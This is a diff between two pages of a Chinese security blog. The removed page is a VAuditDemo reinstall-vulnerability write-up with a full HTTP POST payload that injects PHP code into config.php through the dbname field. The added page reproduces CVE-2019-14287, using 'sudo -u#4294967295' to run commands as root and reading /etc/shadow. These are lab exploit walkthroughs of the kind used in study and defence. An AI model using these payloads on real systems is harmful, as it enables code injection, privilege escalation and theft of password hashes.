@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Vauditdemo reloading vulnerability recurrence | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Vauditdemo reloading vulnerability recurrence | 九世的博客">
+  <title>CVE-2019-14287复现 | 九世的博客</title>
+  <meta name="keywords" content=" Linux提权 ">
+  <meta name="description" content="CVE-2019-14287复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1095,9 +1095,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Vauditdemo-reloading-vulnerability-recurrence" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2019-14287复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Vauditdemo reloading vulnerability recurrence</h1>
+        <h1 class="article-title">CVE-2019-14287复现</h1>
     
     <div class="article-meta">
         
@@ -1106,14 +1106,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">Linux提权</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-20 22:15</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-15 23:31:15">2019-10-15 23:18</time>
         
     </div>
     <div class="article-meta">
@@ -1135,7 +1135,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小实验"><span class="toc-text">小实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞概述"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1150,399 +1150,26 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上刚回到家，发现不值得老哥发了篇文章给我。我赶紧打开看了一看，叮代码审计+复现，[滑稽]<br>剩下自己脑补发生的事情。附上不值得老哥的文章：<a href="http://www.sariel.top/2019/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">vauditdemo重装漏洞 复现 | 只因不值得</a><br><img src="https://images.900.tw/upload_file/41/content/18bc0c10-58ea-136a-9bb8-775436fcc920.jpg" alt="18bc0c10-58ea-136a-9bb8-775436fcc920.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看主文件，index.php</p>
-<pre><code>&lt;?php 
-require_once(&#39;sys/config.php&#39;); /*引用sys/config.php*/
-require_once(&#39;header.php&#39;); /*引用header.php*/
-?&gt;
-&lt;div class=&quot;row&quot;&gt;
-    &lt;?php
-    /* Include */
-    if (isset($_GET[&#39;module&#39;])){
-        include($_GET[&#39;module&#39;].&#39;.inc&#39;);
-    }else{
-    ?&gt;
-    &lt;div class=&quot;jumbotron&quot; style=&quot;text-align: center;&quot;&gt;
-        &lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;
-        &lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;
-    &lt;/div&gt;
-    &lt;div class=&quot;col-lg-12&quot;&gt;
-        &lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;
-        &lt;p&gt;&lt;/p&gt;
-    &lt;/div&gt;
-    &lt;?php
-    }
-    ?&gt;
-&lt;/div&gt;
-
-&lt;?php
-require_once(&#39;footer.php&#39;);
-?&gt;
-
-</code></pre><p>发现开头就引用了config.php和header.php二话不说，跟过去看看，header.php没什么东西看install.php</p>
-<pre><code>&lt;?php
-
-if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;) ) { /*判断是否有/sys/install.lock这个文件*/
-    header( &quot;Location: ../index.php&quot; ); /*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/
-}
-require_once &#39;../header.php&#39;;
-
-function check_writeable( $file ) {
-    if ( file_exists( $file ) ) {
-        if ( is_dir( $file ) ) {
-            $dir = $file;
-            if ( $fp = @fopen( &quot;$dir/test.txt&quot;, &#39;w&#39; ) ) {
-                @fclose( $fp );
-                @unlink( &quot;$dir/test.txt&quot; );
-                $writeable = 1;
-            }
-            else {
-                $writeable = 0;
-            }
-        }
-        else {
-            if ( $fp = @fopen( $file, &#39;a+&#39; ) ) {
-                @fclose( $fp );
-                $writeable = 1;
-            }
-            else {
-                $writeable = 0;
-            }
-        }
-    }
-    else {
-        $writeable = 2;
-    }
-    return $writeable;
-}
-
-$sys_info[&#39;mysql_ver&#39;]     = extension_loaded( &#39;mysql&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;
-$sys_info[&#39;zlib&#39;]          = function_exists( &#39;gzclose&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;
-$sys_info[&#39;gd&#39;]            = extension_loaded( &quot;gd&quot; ) ? &#39;OK&#39; : &#39;NO&#39;;
-$sys_info[&#39;socket&#39;]        = function_exists( &#39;fsockopen&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;
-$sys_info[&#39;curl_init&#39;]        = function_exists( &#39;curl_init&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;
-
-echo &#39;&lt;div id=&quot;ourhp_er&quot;&gt;&#39;;
-echo &#39;&lt;h1&gt;系統環境&lt;/h1&gt;&#39;;
-echo &#39;&lt;p&gt;服務器操作系統:&amp;nbsp;....................................................................&amp;nbsp;&#39;.PHP_OS.&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;Web 服務器:&amp;nbsp;....................................................&amp;nbsp;&#39;.$_SERVER[&#39;SERVER_SOFTWARE&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;PHP 版本:&amp;nbsp;....................................................................&amp;nbsp;&#39;.PHP_VERSION.&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;MySQL 版本:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;mysql_ver&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;Zlib 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;zlib&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;GD2 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;gd&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;Socket 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;socket&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;p&gt;curl 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;curl_init&#39;].&#39;&lt;/p&gt;&#39;;
-echo &#39;&lt;h1&gt;目錄權限&lt;/h1&gt;&#39;;
-
-/* 检查目录 */
-$check_dirs = array (
-    &#39;../sys&#39;,
-    &#39;../uploads&#39;
-);
-
-$i = 0;
-foreach ( $check_dirs as $dir ) {
-    $full_dir = $dir;
-    $check_writeable = check_writeable( $full_dir );
-    if ( $check_writeable == &#39;1&#39; ) {
-        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&#39;#00CC33&#39;&gt;可寫&lt;/font&gt;&lt;/p&gt;&quot;;
-    }
-    elseif ( $check_writeable == &#39;0&#39; ) {
-        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&#39;#ff0000&#39;&gt;不可寫&lt;/font&gt;&lt;/p&gt;&quot;;
-        $no_write = true;
-    }
-    elseif ( $check_writeable == &#39;2&#39; ) {
-        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;b&gt;不存在&lt;/b&gt;&lt;/p&gt;&quot;;
-        $no_write = true;
-    }
-    $i = $i + 1;
-}
-
-if ( $sys_info[&#39;gd&#39;] == &#39;NO&#39; || $sys_info[&#39;curl_init&#39;] == &#39;NO&#39; ) {
-    exit( &#39;組建不支持，無法安裝使用！&#39; );
-}else if ( $check_writeable == &#39;0&#39; || $check_writeable == &#39;2&#39; ) {
-    exit( &#39;關鍵目錄不可寫，無法安裝使用！&#39; );
-}
-
-if ( $_POST ) {
-
-    if ( $_POST[&quot;dbhost&quot;] == &quot;&quot; ) {
-        exit( &#39;数据库连接地址不能为空&#39; );
-    }elseif ( $_POST[&quot;dbuser&quot;] == &quot;&quot; ) {
-        exit( &#39;数据库数据库登录名&#39; );
-    }elseif ( $_POST[&quot;dbname&quot;] == &quot;&quot; ) {
-        exit( &#39;请先创建数据库名称&#39; );
-    }
-
-    $dbhost = $_POST[&quot;dbhost&quot;];
-    $dbuser = $_POST[&quot;dbuser&quot;];
-    $dbpass = $_POST[&quot;dbpass&quot;];
-    $dbname = $_POST[&quot;dbname&quot;];
-
-    $con = mysql_connect( $dbhost, $dbuser, $dbpass );
-    if ( !$con ) {
-        die( &#39;数据库链接出错，请检查账号密码及地址是否正确: &#39; . mysql_error() );
-    }
-
-    $result = mysql_query(&#39;show databases;&#39;) or die ( mysql_error() );;
-    While($row = mysql_fetch_assoc($result)){       
-        $data[] = $row[&#39;Database&#39;];
-    }
-    unset($result, $row);
-    if (in_array(strtolower($dbname), $data)){
-        mysql_close();
-        echo &quot;&lt;script&gt;if(!alert(&#39;數據庫已存在&#39;)){window.history.back(-1);}&lt;/script&gt;&quot;;
-        exit();
-    }
-
-    mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );
-
-    $str_tmp=&quot;&lt;?php\r\n&quot;;
-    $str_end=&quot;?&gt;&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;error_reporting(0);\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#39;/sys/install.lock&#39;)){\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n}\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;include_once(&#39;../sys/lib.php&#39;);\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;
-    $str_tmp.=&quot;mysql_query(&#39;set names utf8&#39;,\$conn);\r\n&quot;;
-    $str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;
-    $str_tmp.=&quot;if (!\$conn)\r\n&quot;;
-    $str_tmp.=&quot;{\r\n&quot;;
-    $str_tmp.=&quot;\tdie(&#39;Could not connect: &#39; . mysql_error());\r\n&quot;;
-    $str_tmp.=&quot;\texit;\r\n&quot;;
-    $str_tmp.=&quot;}\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;session_start();\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=$str_end;
-
-    $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; );
-    fwrite( $fp, $str_tmp );
-    fclose( $fp );
-
-    //创建表
-    mysql_select_db( $dbname, $con );
-    mysql_query( &quot;set names &#39;utf8&#39;&quot;, $con );
-    //导入数据库
-    $sql=file_get_contents( &quot;install.sql&quot; );
-    $a=explode( &quot;;&quot;, $sql );
-    foreach ( $a as $b ) {
-        mysql_query( $b.&quot;;&quot; );
-    }
-    mysql_close( $con );
-    file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;, &#39;virink&#39;);
-    echo &quot;&lt;script&gt;if(!alert(&#39;安裝成功&#39;)){window.location.href=&#39;../index.php&#39;;}&lt;/script&gt;&quot;;
-    exit;
-}else {
-    echo &quot;&lt;form id=&#39;form1&#39; name=&#39;form1&#39; method=&#39;post&#39; action=&#39;&#39;&gt;&quot;;
-    echo &quot;&lt;table width=&#39;100%&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;10&#39; id=&#39;table&#39;&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td colspan=&#39;2&#39;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbhost&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;localhost&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbuser&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbpass&#39; type=&#39;password&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbname&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;vauditdemo&#39;/&gt; *&lt;/td&gt; &quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input type=&#39;submit&#39; class=&#39;btn&#39; name=&#39;Submit&#39; value=&#39;安裝&#39; /&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;/table&gt;&quot;;
-    echo &quot;&lt;/form&gt;&quot;;
-}
-?&gt;
-
-
-&lt;?php
-require_once &#39;../footer.php&#39;;
-?&gt;
-
-</code></pre><p>关键问题</p>
-<pre><code>if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;) ) { /*判断是否有/sys/install.lock这个文件*/
-    header( &quot;Location: ../index.php&quot; ); /*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/
-}
-</code></pre><p>然后下面也没用过滤请求变量的操作，直接写入数据库了</p>
-<pre><code>    $dbhost = $_POST[&quot;dbhost&quot;];
-    $dbuser = $_POST[&quot;dbuser&quot;];
-    $dbpass = $_POST[&quot;dbpass&quot;];
-    $dbname = $_POST[&quot;dbname&quot;];
-
-    $con = mysql_connect( $dbhost, $dbuser, $dbpass );
-    if ( !$con ) {
-        die( &#39;数据库链接出错，请检查账号密码及地址是否正确: &#39; . mysql_error() );
-    }
-
-    $result = mysql_query(&#39;show databases;&#39;) or die ( mysql_error() );; /*直接进行了写入*/
-    While($row = mysql_fetch_assoc($result)){       
-        $data[] = $row[&#39;Database&#39;];
-    }
-    unset($result, $row);
-    if (in_array(strtolower($dbname), $data)){
-        mysql_close();
-        echo &quot;&lt;script&gt;if(!alert(&#39;數據庫已存在&#39;)){window.history.back(-1);}&lt;/script&gt;&quot;;
-        exit();
-    }
-
-    mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );
-
-    $str_tmp=&quot;&lt;?php\r\n&quot;;
-    $str_end=&quot;?&gt;&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;error_reporting(0);\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#39;/sys/install.lock&#39;)){\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n}\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;include_once(&#39;../sys/lib.php&#39;);\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;
-    $str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;; /*这里就是关键2*/
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;
-    $str_tmp.=&quot;mysql_query(&#39;set names utf8&#39;,\$conn);\r\n&quot;;
-    $str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;
-    $str_tmp.=&quot;if (!\$conn)\r\n&quot;;
-    $str_tmp.=&quot;{\r\n&quot;;
-    $str_tmp.=&quot;\tdie(&#39;Could not connect: &#39; . mysql_error());\r\n&quot;;
-    $str_tmp.=&quot;\texit;\r\n&quot;;
-    $str_tmp.=&quot;}\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=&quot;session_start();\r\n&quot;;
-    $str_tmp.=&quot;\r\n&quot;;
-    $str_tmp.=$str_end;
-
-    $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; ); /*写入了config.php*/
-    fwrite( $fp, $str_tmp );
-    fclose( $fp );
-
-    //创建表
-    mysql_select_db( $dbname, $con );
-    mysql_query( &quot;set names &#39;utf8&#39;&quot;, $con );
-    //导入数据库
-    $sql=file_get_contents( &quot;install.sql&quot; );
-    $a=explode( &quot;;&quot;, $sql );
-    foreach ( $a as $b ) {
-        mysql_query( $b.&quot;;&quot; );
-    }
-    mysql_close( $con );
-    file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;, &#39;virink&#39;);
-    echo &quot;&lt;script&gt;if(!alert(&#39;安裝成功&#39;)){window.location.href=&#39;../index.php&#39;;}&lt;/script&gt;&quot;;
-    exit;
-}else {
-    echo &quot;&lt;form id=&#39;form1&#39; name=&#39;form1&#39; method=&#39;post&#39; action=&#39;&#39;&gt;&quot;;
-    echo &quot;&lt;table width=&#39;100%&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;10&#39; id=&#39;table&#39;&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td colspan=&#39;2&#39;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbhost&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;localhost&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbuser&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbpass&#39; type=&#39;password&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input name=&#39;dbname&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;vauditdemo&#39;/&gt; *&lt;/td&gt; &quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;tr&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;td&gt;&lt;input type=&#39;submit&#39; class=&#39;btn&#39; name=&#39;Submit&#39; value=&#39;安裝&#39; /&gt;&lt;/td&gt;&quot;;
-    echo &quot;&lt;/tr&gt;&quot;;
-    echo &quot;&lt;/table&gt;&quot;;
-    echo &quot;&lt;/form&gt;&quot;;
-}
-?&gt;
-</code></pre><p>然后在看config.php</p>
-<pre><code>&lt;?php
-
-error_reporting(0);
-
-if (!file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &#39;/sys/install.lock&#39;)) {
-    header(&quot;Location: /install/install.php&quot;);
-    exit;
-}
-
-include_once &#39;../sys/lib.php&#39;;
-
-$host = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;root&quot;;
-$database = &quot;vauditdemo&quot;; /*由于install.php写入到config.php,可以构造一个这样的payload,exp;-- -&quot;;phpinfo();既能保证mysql的正常查询也能插入payload*/
-
-$conn = mysql_connect($host, $username, $password);
-mysql_query(&#39;set names utf8&#39;, $conn);
-mysql_select_db($database, $conn) or die(mysql_error());
-if (!$conn) {
-    die(&#39;Could not connect: &#39; . mysql_error());
-    exit;
-}
-
-session_start();
-
-?&gt;
-</code></pre><p>payload数据包：</p>
-<pre><code>POST /install/install.php HTTP/1.1
-Host: 127.0.0.1
-Content-Length: 97
-Cache-Control: max-age=0
-Origin: http://127.0.0.1
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
-Content-Type: application/x-www-form-urlencoded
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Referer: http://127.0.0.1/VAuditDemo-master/VAuditDemo_Debug/install/install.php
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.8
-Cookie: PHPSESSID=cob9q8vcbat4tm3a5f8nqoa2p1
-Connection: close
-
-dbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=&quot;nmgcb;-- -&quot;;phpinfo();//&amp;Submit=%E5%AE%89%E8%A3%9D
-</code></pre><p>结果：<br><img src="https://s2.ax1x.com/2019/01/20/kPM3gH.png" alt="kPM3gH.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/20/kPQnMj.png" alt="kPQnMj.png"></p>
-<h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>一开始，我在跳转那里发懵了半天。后面自己demo了一下懂了</p>
-<pre><code>&lt;?php
-if(file_exists(&#39;haq520.txt&#39;)){
-    header(&quot;Location: ../demo3.php&quot;);
-}
-$username=$_GET[&#39;u&#39;];
-$fk=fopen(&quot;haq520.txt&quot;,&quot;a&quot;);
-$txt=$username;
-fwrite($fk,$txt);
-fclose($fk);
-?&gt;
-</code></pre><p>然后请求为</p>
-<pre><code>http://127.0.0.1/demo7.php?u=此生不是你，终身不娶
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/20/kPQGJU.png" alt="kPQGJU.png"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有些不懂的地方多多实验或者写个差不多的例子可以明白的快一点</p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天在公众号见到消息说是，那就复现一哈子吧<br><img src="https://s2.ax1x.com/2019/10/15/KP2TZn.png" alt="KP2TZn.png"></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>VM:Kali
+</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote>
+<p>这个漏洞的 CVE 编号是CVE-2019-14287，是由苹果信息安全部门的研究员 Joe Vennix 发现并分析的。与其说让人恐慌，不如说让人兴趣盎然：它要求系统具有非标准配置。换句话说，在默认情况下，Linux 计算机并不易受攻击。然而，如果你的配置是这样的：让用户以 root 权限以外的其他用户权限运行命令，那么可能就需要注意了：因为用户可以通过命令行上的 –u#-1 绕过这个非 root限制。如果将 sudo配置为允许用户通过Runas 规范中的 ALL 关键字以任意用户身份运行命令，则可以通过指定用户 ID为-1 或4294967295 以 root 用户身份运行命令。只要Runas 规范中最先列出 ALL 关键字，即使Runas 规范明确禁止 root访问权限，那么具有足够的 sudo 权限的而用户即可以 root 身份运行命令。以这种方式运行的命令的日志条目会把目标用户列为 4294967295而非 root。另外，将不会为该命令运行 PAM 会话模块。具体而言：利用该漏洞要求用户具有 sudo 权限，从而以任意用户 ID 运行命令。一般而言，这意味着用户的 sudoers 条目在 Runas 规范中具有特殊值 ALL。Sudo 支持在 sudoers 策略允许的情况下，以用户指定的名称或用户 ID 运行命令。例如，如下 sudoers 条目允许 id 命令以任意用户身份运行，因为它包含 Runas 规范中的关键字 ALL</p>
+</blockquote>
+<p>漏洞影响范围</p>
+<pre><code>1.8.28之前的所有 Sudo 版本均受影响
+</code></pre><p>修复方案</p>
+<pre><code>Sudo 1.8.28 版本已修复该漏洞。强烈建议 Linux用户将 sudo包手动更新至最新版本
+</code></pre><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>在/etc/sudoers 文件中写入一行</p>
+<pre><code>myhost alice = (ALL) /usr/bin/id
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/15/KPRFJK.png" alt="KPRFJK.png"></p>
+<p>执行以下command即可以root权限运行id命令</p>
+<pre><code> sudo -u#4294967295 id
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/15/KPRkRO.png" alt="KPRkRO.png"></p>
+<p>更直观的感受一下，把命令id改为cat，然后以demo用户读取/etc/shadow<br><img src="https://s2.ax1x.com/2019/10/15/KPRudI.png" alt="KPRudI.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/15/KPRaoq.png" alt="KPRaoq.png"></p>
+<p>这究竟是为啥子会有这种操作出现呢<br><img src="https://s2.ax1x.com/2019/10/15/KPRAzD.png" alt="KPRAzD.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/15/KPRZsH.png" alt="KPRZsH.png"></p>
+<p>参考链接:<a href="https://www.freebuf.com/news/216821.html" target="_blank" rel="noopener">Linux Sudo被曝漏洞，可导致用户以root权限运行命令 - FreeBuf互联网安全新媒体平台</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1552,12 +1179,12 @@ fclose($fk);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Vauditdemo reloading vulnerability recurrence</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2019-14287复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-20, 22:15:12</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/70e2f438.html" title="Vauditdemo reloading vulnerability recurrence">http://422926799.github.io/posts/70e2f438.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-15, 23:18:33</p>
